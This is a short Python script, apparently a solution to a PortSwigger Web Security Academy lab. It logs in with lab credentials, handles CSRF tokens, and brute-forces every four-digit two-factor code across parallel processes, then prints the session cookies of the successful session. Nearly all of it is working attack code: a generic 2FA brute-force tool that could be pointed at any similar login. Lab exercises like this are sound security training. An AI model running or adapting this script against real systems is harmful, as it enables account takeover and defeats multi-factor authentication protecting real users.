#!/usr/bin/env python3

# Lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

# Brute forcing a CSRF protected login and bypassing 2FA.
# Using threads this time to speed things up a bit.

import sys
import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool

USER = "carlos"
PASS = "montoya"

pool = None

def mfabypass(target, pin):
	s = requests.Session()

	login_url = f'{target}/login'
	mfa_url = f'{target}/login2'

	# Get login CSRF token
	bs = BeautifulSoup(s.get(login_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	# Login
	login_data = {"csrf":csrftoken, "username":USER, "password":PASS}
	s.post(login_url, data=login_data)

	# Get 2FA CSRF token
	bs = BeautifulSoup(s.get(mfa_url).content, features='lxml')
	csrftoken = bs.find('input', {"name":"csrf"})['value']

	# Brute force 2FA pin
	mfa_data = {"csrf":csrftoken, "mfa-code":f'{pin:04}'}
	r = s.post(mfa_url, data=mfa_data)
	return {'r':r,'s':s,'p':pin}

def cb_mfabypass(resp):
	global pool
	r = resp['r']
	s = resp['s']
	pin = resp['p']
	if not ("Incorrect" in r.text):
		print(f'DONE: {pin:04}')
		print(r.status_code)
		print(s.cookies)
		pool.terminate()
	else:
		if "Incorrect" in r.text:
			print(f'>{pin:04}<>{r.status_code}<')
		else:
			print(f'<<<UNEXPECTED RESPONSE>>>')
	s.close()

def main(target):
	global pool
	try:
		with Pool(processes=10) as pool:
			reqs = []
			for pin in range(10000):
				reqs.append(pool.apply_async(mfabypass, args=(target,pin,), callback=cb_mfabypass))
			pool.close()
			pool.join()
	except:
		print(f'Aborted')
		sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print(f'Usage: {sys.argv[0]} <https://target-url>')
		sys.exit(1)
	main(sys.argv[1].strip('/'))
